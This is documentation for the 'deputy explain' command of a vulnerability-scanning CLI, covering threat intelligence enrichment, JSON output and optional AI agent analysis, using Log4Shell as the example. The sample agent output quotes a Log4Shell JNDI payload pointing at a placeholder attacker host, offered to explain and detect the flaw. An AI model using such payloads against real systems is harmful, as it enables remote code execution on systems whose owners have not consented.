# `deputy explain`

Get detailed, context-rich explanations of vulnerabilities by ID.

## Synopsis

```
deputy explain <vuln-id> [vuln-id...] [flags]
```

## When to Use

- You found a vulnerability in a scan and need to understand its impact
- You want threat intelligence context (EPSS scores, KEV catalog)
- You need agent-assisted analysis to explain complex vulnerabilities
- You're preparing a report for stakeholders or management

## Flags

| Flag | Short | Default | Description |
| --- | --- | --- | --- |
| `--format` | `-f` | `text` | Output format: `text`, `json` |
| `--enrich` | | `true` | Enrich with threat intelligence (EPSS, KEV) |
| `--agent` | | | AI agent to use: `claude`, `codex` |
| `--agent-model` | | | Model identifier to use when `--agent` is set |
| `--agent-sandbox` | | `read-only` | Sandbox policy: `read-only`, `workspace-write`, `danger-full-access` |

## Examples

### Basic Usage

```console
# Explain a single vulnerability
$ deputy explain CVE-2021-44228

# Explain multiple vulnerabilities
$ deputy explain GHSA-jfh8-c2jp-5v3q CVE-2023-45853
```

### Threat Intelligence

```console
# Full explanation with threat intelligence (default)
$ deputy explain CVE-2021-44228

# Skip threat intelligence lookup (faster, works offline)
$ deputy explain --enrich=false CVE-2021-44228
```

### Agent-Assisted Analysis

```console
# Get agent analysis (read-only mode by default)
$ deputy explain --agent claude CVE-2021-44228
$ deputy explain --agent codex CVE-2021-44228

# Use a specific model
$ deputy explain --agent codex --agent-model gpt-4 CVE-2021-44228
```

The `--agent` flag delegates analysis to an AI agent, providing:
- Plain-English explanation of the vulnerability
- Potential impact if exploited
- Who should be concerned (affected application types)
- Key remediation steps

### JSON Output

```console
# Machine-readable output for automation
$ deputy explain --format json CVE-2021-44228

# Process multiple vulnerabilities
$ deputy explain --format json CVE-2021-44228 GHSA-jfh8-c2jp-5v3q | jq '.severity'
```

## Output

### Text Format

```
CVE-2021-44228 [CRITICAL] 10.0 v3.1
  GHSA-jfh8-c2jp-5v3q
  Remote code execution via JNDI lookup
  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

Threat Intelligence
  ! KEV Known Exploited Vulnerability
    added 2021-12-10  due 2021-12-24 OVERDUE
    used in ransomware campaigns
  EPSS 97.5% probability of exploitation in 30 days
    high risk - more likely to be exploited than 99% of CVEs

Timeline
  disclosed 2021-12-10  3 years ago
  updated   2024-01-15  11 months ago
  long-standing - should be patched by now

Weakness
  CWE-502 Deserialization of Untrusted Data
    The product deserializes untrusted data without...
    Data Handling

Affected
  Maven
    org.apache.logging.log4j:log4j-core
      >= 2.0-beta9  fix 2.17.0

References
  advisory
    https://logging.apache.org/log4j/2.x/security.html
  fix
    https://github.com/apache/logging-log4j2/pull/608

Quick Links
  https://osv.dev/vulnerability/CVE-2021-44228
  https://nvd.nist.gov/vuln/detail/CVE-2021-44228
```

### Agent Analysis Section

When `--agent` is enabled, an additional section appears:

```
Agent Analysis

**What This Means**

Log4Shell is a critical remote code execution vulnerability in Apache Log4j,
a ubiquitous Java logging library. An attacker can execute arbitrary code on
any system that logs user-controlled input by crafting a malicious JNDI
lookup string like `${jndi:ldap://attacker.com/exploit}`.

**Impact**

- **Severity**: Maximum (10.0 CVSS)
- **Exploitability**: Trivial - single HTTP request can trigger
- **Scope**: Any Java application using Log4j 2.0-beta9 through 2.14.1

**Who Should Be Concerned**

- Java backend services that log HTTP headers, query params, or user input
- Applications using Spring Boot, Apache Struts, or similar frameworks
- Any system with Log4j in its dependency tree

**Remediation**

1. **Immediate**: Upgrade to Log4j 2.17.0 or later
2. **Mitigation**: Set `log4j2.formatMsgNoLookups=true` as system property
3. **Detection**: Search logs for `${jndi:` patterns
```

### JSON Format

```json
{
  "id": "CVE-2021-44228",
  "severity": "CRITICAL",
  "cvss": {
    "score": 10.0,
    "version": "3.1",
    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  },
  "attack_surface": "Network-accessible, no authentication required",
  "attack_characteristics": {
    "remote_exploitable": true,
    "authentication_required": false,
    "user_interaction": false,
    "complexity": "low"
  },
  "summary": "Remote code execution via JNDI lookup",
  "aliases": ["GHSA-jfh8-c2jp-5v3q"],
  "timeline": {
    "published": "2021-12-10T00:00:00Z",
    "modified": "2024-01-15T00:00:00Z",
    "age_days": 1122,
    "age_human": "3 years"
  },
  "intel": {
    "epss": 0.975,
    "epss_percentile": 0.999,
    "in_kev": true,
    "kev_date_added": "2021-12-10",
    "kev_due_date": "2021-12-24",
    "kev_ransomware": true
  },
  "affected": [
    {
      "ecosystem": "Maven",
      "package": "org.apache.logging.log4j:log4j-core",
      "vulnerable_range": ">=2.0-beta9, <2.17.0",
      "fixed_versions": ["2.17.0"],
      "remediation": "Upgrade to 2.17.0 or later"
    }
  ],
  "weaknesses": [
    {
      "id": "CWE-502",
      "name": "Deserialization of Untrusted Data",
      "category": "Data Handling"
    }
  ],
  "links": {
    "osv": "https://osv.dev/vulnerability/CVE-2021-44228",
    "nvd": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  }
}
```

## Supported Vulnerability IDs

| Format | Example | Source |
| --- | --- | --- |
| CVE | `CVE-2021-44228` | MITRE/NVD |
| GHSA | `GHSA-jfh8-c2jp-5v3q` | GitHub Security Advisories |
| GO- | `GO-2024-2687` | Go Vulnerability Database |
| RUSTSEC | `RUSTSEC-2024-0001` | RustSec Advisory Database |
| OSV | Any OSV-compatible ID | Open Source Vulnerabilities |

## Agents

The `--agent` flag delegates analysis to an AI agent. Agents run in **read-only mode by default** for the explain command.

### Supported Agents

| Agent | CLI | Description |
| --- | --- | --- |
| `claude` | [Claude Code](https://github.com/anthropics/claude-code) | Anthropic's Claude Code CLI |
| `codex` | [Codex](https://github.com/openai/codex) | OpenAI's Codex CLI |

### Installation

```bash
# Claude Code
npm install -g @anthropic-ai/claude-code
claude --version

# Codex
npm install -g @openai/codex
codex --version
```

### Sandbox Modes

The explain command defaults to `read-only` mode, meaning agents cannot modify files:

| Mode | Description |
| --- | --- |
| `read-only` | Agent can only analyze, no file modifications (default) |
| `workspace-write` | Agent can edit files in the workspace |
| `full-access` | Unrestricted access (use with caution) |

```bash
# Default: read-only analysis
deputy explain --agent claude CVE-2021-44228

# Allow agent to create notes/reports
deputy explain --agent claude --agent-sandbox workspace-write CVE-2021-44228
```

This design is consistent with `deputy fix --agent` and `deputy triage --agent`, which use `workspace-write` by default since they need to modify files.

## Exit Codes

| Code | Meaning |
| --- | --- |
| `0` | Success |
| `1` | Error (vulnerability not found, API error) |

## See Also

- [Scan command](scan.md) - Find vulnerabilities in your project
- [Fix command](fix.md) - Generate remediation plans
- [Agents guide](../guides/agents.md) - AI-assisted workflows

## Code Pointers

- CLI: [`internal/cli/cmd/explain.go`](../../internal/cli/cmd/explain.go)
- Renderer: [`internal/explain/renderer.go`](../../internal/explain/renderer.go)
- AI render: [`internal/ai/render/render.go`](../../internal/ai/render/render.go)
